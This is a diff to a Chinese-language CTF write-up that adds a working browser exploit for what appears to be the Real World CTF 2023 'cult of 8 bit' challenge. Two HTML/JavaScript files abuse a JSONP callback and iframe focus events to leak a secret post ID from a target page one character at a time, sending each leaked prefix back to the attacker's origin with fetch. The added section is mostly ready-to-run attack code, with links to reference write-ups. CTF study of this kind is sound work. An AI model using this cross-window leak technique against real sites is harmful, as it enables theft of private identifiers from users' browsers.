@@ -126,5 +126,77 @@ router.get("/post/:id", (req, res) => {
 
 url=>  `http://localhost:12345/post/?id=ad2a46df-4b36-470a-aa39-79acec6ca801?callback=function#`
 
+### exp
+index.html
+```js
+<script>
+    const host = "http://localhost:12345"
+    window.open("./exp.html","_blank")
+    location.replace(host)
+</script>
+```
+
+exp.html
+
+```js
+<a id="default" href="#">default</a>
+<script>
+    async function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    const selfId = "ad2a46df-4b36-470a-aa39-79acec6ca801";//自己给个存在的post id
+    const host = "http://localhost:12345";//题目地址
+    const charList = "0123456789abcdef-";
+    var resId = "";
+  
+    function createCharIframe(name) {
+        var tmpIframe = document.createElement('iframe');
+        tmpIframe.name = name;
+        document.body.appendChild(tmpIframe);
+    }
+    charList.split('').forEach(name => createCharIframe(name));
+  
+    (function createChallengeIframe() {
+        var challengeIframe = document.createElement('iframe');
+        challengeIframe.name = "challenge";
+        challengeIframe.src = host;
+        challengeIframe.allow = "sync-xhr 'none'";//使用特征策略禁止xhr
+        document.body.appendChild(challengeIframe);
+    })();
+  
+    async function exploit() {
+  
+        var challenge = window['challenge'];
+        for(let i = 0; i < 36; i++) {
+            //payload
+            let payload = `top[top.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`;
+            challenge.location = `${host}/pot/?id=${selfId}%3Fcallback=${payload}%23`;
+
+            await sleep(200);//时间根据情况调整
+        }
+    }
+  
+    //监听焦点变化
+    function listenFocus() {
+  
+        var activeFocusName = document.activeElement.name;
+        if(activeFocusName) {//若监听到iframe焦点
+            resId += activeFocusName;
+            document.getElementById("default").focus();//初始化焦点
+            fetch(`/res/${resId}`);
+        }
+    }
+    setInterval(listenFocus, 100);
+    sleep(2000);
+    exploit();
+</script>
+```
+
+
+
 ## 参考文章
 https://blog.huli.tw/2022/04/07/iframe-and-window-open/
+
+https://mp.weixin.qq.com/s/RZSNb2tdvp5Q2Y41b9LXvw?ref=www.ctfiot.com
+
+https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit
